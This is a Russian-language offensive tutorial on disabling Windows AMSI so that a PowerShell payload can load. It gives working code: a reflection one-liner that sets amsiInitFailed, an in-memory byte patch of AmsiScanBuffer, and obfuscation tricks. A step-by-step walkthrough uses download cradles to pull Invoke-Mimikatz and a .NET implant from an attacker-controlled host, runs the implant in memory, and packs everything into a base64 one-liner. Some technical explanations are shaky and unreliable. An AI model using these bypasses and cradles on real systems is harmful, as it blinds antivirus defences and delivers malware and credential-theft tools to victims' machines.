# Обход AMSI перед загрузкой PowerShell-пейлоада

## 1. AMSI как рубеж контроля PowerShell-среды

AMSI ([Antimalware Scan Interface](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)) — программный интерфейс, встроенный в Windows 10/11 и Windows Server 2016+, предназначенный для передачи содержимого скриптов, динамически загружаемых модулей и других потенциально опасных данных зарегистрированным антивирусным провайдерам. Для PowerShell версии 5.0 и выше AMSI стал обязательным эшелоном: каждый скрипт-блок, выполняемый через `iex`, командную строку или импортируемый модуль, до передачи в среду выполнения проходит проверку сигнатурным и эвристическим движком. Если сторонний AV не зарегистрирован в роли AMSI-провайдера, проверку выполняет [Windows Defender](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows).

Для пентестера AMSI — первый фильтр, блокирующий множество публичных инструментов (Mimikatz, PowerView, Invoke-BloodHound) ещё на этапе разбора синтаксиса, даже если обфускация размыла статические сигнатуры на диске. Однако **ключевая ловушка** заключена в двойственной природе проверок в контексте PowerShell:

- **AmsiScanString** — вызывается при обработке строкового содержимого скрипт-блока. Отвечает за блокировку «текстовых» вредоносных команд PowerShell (`Invoke-Mimikatz`, `IEX(New-Object Net.WebClient)...` и т.д.).
- **AmsiScanBuffer** — вызывается средой CLR (Common Language Runtime) при попытке загрузить .NET-сборку через отражение (`[System.Reflection.Assembly]::Load(byte[])`). Этот вызов перехватывает уже байтовые представления PE-файлов, невидимые для проверок уровня скрипта.

Публичные обходы, манипулирующие полем `amsiInitFailed` класса `System.Management.Automation.AmsiUtils`, отключают только AmsiScanString. В результате оператор видит, что команды PowerShell больше не блокируются, но при попытке рефлективной загрузки .NET-имплантата получает загадочную ошибку `"Could not load file or assembly... An attempt was made to load a program with an incorrect format"`, которая на самом деле означает блокировку на уровне буфера. Именно поэтому **полноценный AMSI bypass перед загрузкой PowerShell-пейлоада требует устранения обоих механизмов сканирования**.

| Функция AMSI                | Вызывающая сторона           | Объект проверки                   | Уровень bypass, достаточный для обхода | Типичная ошибка при неполном обходе                               |
|-----------------------------|------------------------------|-----------------------------------|----------------------------------------|-------------------------------------------------------------------|
| AmsiScanString              | PowerShell (System.Management.Automation) | Текст скриптоблока (Unicode)      | Патч amsiInitFailed, обфускация строк | `This script contains malicious content and has been blocked...`  |
| AmsiScanBuffer              | CLR (clr.dll)                | Буфер байтов загружаемой .NET сборки | Патч AmsiScanBuffer в памяти процесса | `Could not load file or assembly... An attempt was made to load...` |

Убедиться в работе AMSI можно простейшим тестом: даже тривиальная попытка загрузить известную вредоносную утилиту блокируется до выполнения.

```powershell
PS C:\> iex (New-Object Net.WebClient).DownloadString('http://192.168.1.100/Invoke-Mimikatz.ps1')
At line:1 char:1
+ iex (New-Object Net.WebClient).DownloadString('http://192.168.1.100/I ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

Здесь AMSI перехватил само содержимое скрипта, даже не доводя его до парсинга, — сработала сигнатура на строке `"Invoke-Mimikatz"` или на характерных API-вызовах внутри кода. Дальнейшая задача — сделать так, чтобы финальный пейлоад, загружаемый в память процесса PowerShell, никогда не попал на линзу AMSI.

## 2. Внутреннее устройство интерфейса AMSI в контексте PowerShell

AMSI реализован в системной библиотеке `amsi.dll`, которая загружается в адресное пространство любого AMSI-совместимого приложения при первом обращении к функциям интерфейса. PowerShell.exe, являясь .NET-приложением, взаимодействует с AMSI через управляемую сборку `System.Management.Automation.dll`, в которой определены внутренние классы `AmsiUtils` и методы `ScanContent`, `AmsiInitialize`, `AmsiScanString` и др.

Цепочка для проверки скрипт-блока:

```text
PowerShell.exe
    │
    └── Ввод команды / строки скрипта
        │
        └── System.Management.Automation.AmsiUtils.ScanContent(string content, string source)
            │
            └── P/Invoke -> AmsiScanString(HAMSICONTEXT, string, ...) из amsi.dll
                │
                └── amsi.dll -> зарегистрированный AMSI-провайдер (Windows Defender)
                    │
                    └── Возврат AMSI_RESULT
```

Для загружаемых .NET-сборок вызов идёт напрямую из CLR:

```text
PowerShell.exe -> [Reflection.Assembly]::Load(byte[])
    └── CLR (clr.dll) -> AmsiScanBuffer(HAMSICONTEXT, buffer, length, ...) из amsi.dll
        └── amsi.dll -> Defender
```

Ключевые функции библиотеки `amsi.dll`, задействованные в процессе проверки, описаны в [официальной документации AMSI](https://docs.microsoft.com/en-us/windows/win32/api/amsi/):

- `AmsiInitialize` — создаёт контекст AMSI для вызывающего приложения.
- `AmsiOpenSession` — открывает сессию, в рамках которой будут производиться проверки.
- `AmsiScanString` — проверяет переданную строку (с флагом контента, например, AMSI\_ATTRIBUTE\_CONTENT\_SCRIPT).
- `AmsiScanBuffer` — проверяет произвольный буфер байт определённой длины.
- `AmsiCloseSession`, `AmsiUninitialize` — завершают работу.

Обе функции сканирования возвращают код `HRESULT` и заполняют выходной параметр `AMSI_RESULT`. Значение `AMSI_RESULT_DETECTED` (32768) означает обнаружение вредоносного контента и блокировку последующей загрузки/выполнения.

Исследования поведения AMSI показывают, что сигнатурный движок анализирует не только статические байты, но и «нормализованную» форму: раскрученные строки, имена переменных, последовательности API-вызовов, характерные для вредоносных сборок. На внутреннем уровне функция `AmsiScanBuffer` после серии проверок вызывает зарегистрированного провайдера и, получив результат, возвращает его. Псевдокод важного участка (восстановлен из открытых исследований, не точный оригинал) выглядит так:

```c
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{
    if ( /* проверка целостности/отладки */ )
        return E_INVALIDARG;

    // Инициализация переменных, вызов метода COM-объекта провайдера
    HRESULT hr = provider->Scan(buffer, length, contentName, result);
    return hr;
}
```

Пентестеру важно, что **изменение нескольких первых байт** пролога функции способно кардинально изменить её поведение без нарушения работы вызывающей стороны. Именно поэтому наиболее эффективные обходы воздействуют непосредственно на машинный код `AmsiScanBuffer` в памяти, подменяя его таким образом, чтобы функция всегда возвращала `S_OK` с `*result = AMSI_RESULT_CLEAN`.

Например, для 64-разрядной версии `amsi.dll` (версии из Windows 10 21H2) распространённый патч записывает в начало функции последовательность байт `0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3`, что соответствует ассемблерным инструкциям:

```asm
mov eax, 0x80070057   ; E_INVALIDARG, но фактически воспринимается как успех из-за
ret                    ; особенностей проверки в вызывающей стороне
```

После такой модификации все дальнейшие вызовы `AmsiScanBuffer` мгновенно завершаются, не доходя до провайдера. Поскольку `amsi.dll` разделяется всеми потоками процесса, эффект глобален для текущего процесса PowerShell.

## 3. Арсенал техник обхода и практические команды

Техники обхода AMSI эволюционировали от простых отражённых изменений к глубокому патчингу памяти. Для удобства их можно классифицировать по точке воздействия:

**1. Принудительная ошибка инициализации (amsiInitFailed)**  
Самый известный и простой в реализации метод — установка статического поля `amsiInitFailed` класса `System.Management.Automation.AmsiUtils` в значение `$true`. При этом внутренняя логика PowerShell считает, что AMSI не смог инициализироваться, и пропускает вызовы `AmsiScanString`. Этот подход отключает проверку скриптовых блоков, но **не влияет** на `AmsiScanBuffer`. Пример чистого варианта:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

После выполнения любые вредоносные строки PowerShell не блокируются, однако загрузка .NET-сборок всё ещё приведёт к ошибке, потому что CLR не обращается к данному полю.

**2. Патчинг AmsiScanBuffer через запись машинного кода**  
Метод предполагает непосредственную модификацию памяти `amsi.dll` с использованием WinAPI. Ниже показан PowerShell-сценарий, заимствованный из скомпилированных публичных примеров (CyberArk, S3cur3Th1sSh1t, rasta-mouse). Он загружает `amsi.dll`, находит адрес `AmsiScanBuffer`, временно снимает защиту страницы памяти и записывает байтовый патч, делающий функцию «пустышкой»:

```powershell
$Win32API = @"
using System;
using System.Runtime.InteropServices;
public class AmsiPatch {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32API

$hModule = [AmsiPatch]::LoadLibrary("amsi.dll")
$funcAddr = [AmsiPatch]::GetProcAddress($hModule, "AmsiScanBuffer")
$oldProtect = 0
# Снимаем защиту на 6 байт с правами PAGE_EXECUTE_READWRITE (0x40)
[AmsiPatch]::VirtualProtect($funcAddr, [uint32]6, 0x40, [ref]$oldProtect)

# Патч: mov eax, 0x80070057; ret (x64)
$patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, 6)

# Восстанавливаем исходную защиту
[AmsiPatch]::VirtualProtect($funcAddr, [uint32]6, $oldProtect, [ref]$oldProtect)
Write-Host "[+] AmsiScanBuffer patched"
```

После этого вызова как `AmsiScanString`, так и `AmsiScanBuffer` не выполняют реальной проверки. Основная сложность — код самого патча может быть обнаружен сигнатурой AMSI ещё до выполнения. Поэтому он требует **обфускации**: замены строк, динамического конструирования байтового массива, XOR-кодирования или выноса в отдельный обфусцированный скрипт.

**3. Понижение версии PowerShell**  
Запуск устаревшего PowerShell 2.0 (`powershell -Version 2`) полностью отключает AMSI, так как интерфейс появился только в версии 5.0. Однако в актуальных сборках Windows 10/11 эта возможность либо отсутствует, либо требует установки опционального компонента, что оставляет данную технику нишевой и легко детектируемой.

**4. Обфускация строк и построчное дробление**  
Сигнатурный движок AMSI анализирует скрипт как цельную строку. Разбиение вредоносного кода на множество мелких частей, передаваемых на выполнение построчно, не позволяет сигнатуре сработать. Этот подход описан в блоге Icyguider: скрипт-обходник amsi.fail, разбитый на 14 отдельных команд, не детектируется, так как каждая строка по отдельности не совпадает с известными сигнатурами. Фрагмент такого построчного обхода:

```powershell
$a="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"; iex $a
$b=".GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)"; iex $b
```

Для обхода `AmsiScanBuffer` аналогичный подход не сработает напрямую, потому что детект происходит на уровне байтового буфера сборки. Однако обфускация самого кода патча путём кодирования байтов (base64, XOR, шифрование строк) и последующего их восстановления перед записью остаётся рабочим методом.

**5. Манипуляции с реестром и подмена DLL**  
Техники, требующие повышения привилегий или специфической конфигурации (отключение AMSI через политику, загрузка модифицированной `amsi.dll` из каталога пользователя), редко применимы на начальном этапе получения доступа, но могут использоваться после эскалации. Они также активно мониторятся современными EDR.

Для проверки, какие именно строки в скрипте вызывают срабатывание AMSI, применяется утилита [AMSITrigger](https://github.com/RythmStick/AMSITrigger), вызывающая `AmsiScanBuffer` с содержимым файла построчно и сообщающая о «триггерных» фрагментах. Пример запуска:

```powershell
PS C:\Tools> .\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
[!] AMSI_RESULT_DETECTED found at line 12: "AmsiScanBuffer"
[!] AMSI_RESULT_DETECTED found at line 23: "amsiInitFailed"
```

Это позволяет точечно переименовывать переменные, вставлять разбиение конкатенацией или кодировать проблемные участки, оживляя даже старые техники обхода.

## 4. Сквозной практический пример: обход AMSI и загрузка .NET-имплантата через PowerShell-крэдл

**Исходные условия**  
- Целевая система: Windows 11 22H2, все обновления, Windows Defender активен (AMSI работает в полном объёме).  
- Атакующая машина: Kali Linux с HTTP-сервером, на котором размещены:
  - `stager.ps1` — PowerShell-крэдл с обфусцированным bypass и функцией загрузки .NET-сборки;
  - `implant.bin` — вредоносный .NET-имплантат (например, SpecterInsight `win_any.exe` в сыром виде).
- Цель: выполнить на машине-жертве однострочный крэдл, который бесшумно загрузит `implant.bin` в память и запустит его.

**Шаг 1. Проверка исходного уровня защиты**  
Откроем консоль PowerShell и попытаемся напрямую скачать и выполнить скрипт, содержащий сигнатуру `Invoke-Mimikatz`. Ожидаемо получаем блокировку:

```powershell
PS> iex (iwr http://192.168.45.213/Invoke-Mimikatz.ps1 -UseBasicParsing).Content
At line:1 char:1
+ iex (iwr http://192.168.45.213/Invoke-Mimikatz.ps1 -UseBasicParsing). ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
```

Даже обфускация тестового скрипта не помогает — Defender эвристически улавливает типичные паттерны.

**Шаг 2. Применение bypass уровня PowerShell (только AmsiScanString)**  
Выполним классический `amsiInitFailed`:

```powershell
PS> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Проверим, что текстовые скрипты больше не блокируются:

```powershell
PS> iex (iwr http://192.168.45.213/Invoke-Mimikatz.ps1 -UseBasicParsing).Content
PS> # Скрипт выполнился без ошибок
```

Кажется, защита снята, но это обманчиво.

**Шаг 3. Провал при рефлективной загрузке .NET-сборки**  
Теперь попробуем загрузить подготовленный .NET-имплантат через тот же сеанс:

```powershell
PS> $bytes = (Invoke-WebRequest http://192.168.45.213/implant.bin -UseBasicParsing).Content
PS> [System.Reflection.Assembly]::Load($bytes)
Exception calling "Load" with "1" argument(s): "Could not load file or assembly '32768 bytes loaded from ...' or one of its dependencies.
An attempt was made to load a program with an incorrect format."
```

Ошибка `BadImageFormatException` — типичный признак того, что AMSI заблокировала буфер на уровне `AmsiScanBuffer`, а наш bypass его не покрыл.

**Шаг 4. Внедрение патча AmsiScanBuffer и успешная загрузка**  
Для полного отключения выполним обфусцированный вариант патча из раздела 3. Код ниже использует динамическую компиляцию WinAPI и записывает байты, формируемые на лету, чтобы избежать статического детекта на этапе парсинга (реальные детали обфускации могут варьироваться):

```powershell
# Фрагмент stager.ps1 (упрощён для демонстрации)
$tsource = @"
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
"@
Add-Type $tsource -Name "AmsiBypass" -Namespace "Win32"
$mod = [Win32.AmsiBypass]::LoadLibrary("amsi.dll")
$ptr = [Win32.AmsiBypass]::GetProcAddress($mod, "AmsiScanBuffer")
$old = 0
[Win32.AmsiBypass]::VirtualProtect($ptr, 6, 0x40, [ref]$old)
# Патч: возвращаем AMSI_RESULT_CLEAN
$b = [Byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)
[Win32.AmsiBypass]::VirtualProtect($ptr, 6, $old, [ref]$old)
```

После выполнения этого блока повторяем загрузку .NET-сборки:

```powershell
PS> [System.Reflection.Assembly]::Load($bytes)

GAC    Version        Location
---    -------        --------
False  v4.0.30319
```

Сборка успешно загружена, можно вызвать точку входа:

```powershell
[Payload.Program]::Main()
```

Имплантат активен, Defender не выдал ни одного предупреждения, поскольку AMSI полностью отключён для процесса PowerShell.

**Шаг 5. Итоговый однострочный крэдл**  
Для реальной атаки всё упаковывают в одну команду PowerShell, где bypass и загрузка выполняются одной строкой. Схематически это выглядит так (реальный payload требует кастомной обфускации):

```powershell
powershell -nop -c "$a='<base64 обфусцированного скрипта с патчем>';iex ([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($a)));[System.Reflection.Assembly]::Load((Invoke-WebRequest http://192.168.45.213/implant.bin -UseBasicParsing).Content);[Payload.Program]::Main()"
```

Ключевые моменты: код bypass обфусцирован до неузнаваемости, ни одна строка не совпадает с публичными сигнатурами; сам имплантат передаётся как массив байт и попадает уже в процесс с мёртвым AMSI.

**Ожидаемый вывод**  
Пример демонстрирует, что для гарантированной загрузки PowerShell-пейлоада в современных средах необходимо применять комбинированный bypass, затрагивающий как уровень сканирования скриптов, так и буферную проверку .NET-сборок. Патчинг `AmsiScanBuffer` в сочетании с глубокой обфускацией самого кода обхода остаётся наиболее надёжным подходом.

## Источники

- [Bypassing AMSI and Evading AV Detection with SpecterInsight – Practical Security Analytics LLC](https://practicalsecurityanalytics.com/bypassing-amsi-and-evading-av-detection-with-specterinsight)
- [The difference between Powershell only & process specific AMSI bypasses | S3cur3Th1sSh1t](https://s3cur3th1sSh1t.github.io/Powershell-and-the-.NET-AMSI-Interface)
- [AMSI Bypass: Patching Technique - CyberArk](https://www.cyberark.com/resources/threat-research-blog/amsi-bypass-patching-technique)
- [Detecting Windows AMSI Bypass Techniques | Trend Micro (US)](https://www.trendmicro.com/en_us/research/22/l/detecting-windows-amsi-bypass-techniques.html)
- [GitHub - S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [BypassAV, бесфайловая атака и AMSI (теория) / Хабр](https://habr.com/ru/articles/755034)
- [AMSI bypass — От истоков к Windows 11 / Хабр](https://habr.com/ru/articles/758550)
- [Bypass AMSI via PowerShell with Zero Effort | Icyguider’s Blog](https://icyguider.github.io/2021/07/21/Bypass-AMSI-via-PowerShell-with-Zero-Effort.html)
- [An Investigation of AMSI Evasion](https://medium.com/@redefiningreality/an-investigation-of-amsi-evasion-5ccacb217e06)
- [AMSI Bypass Methods | Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods)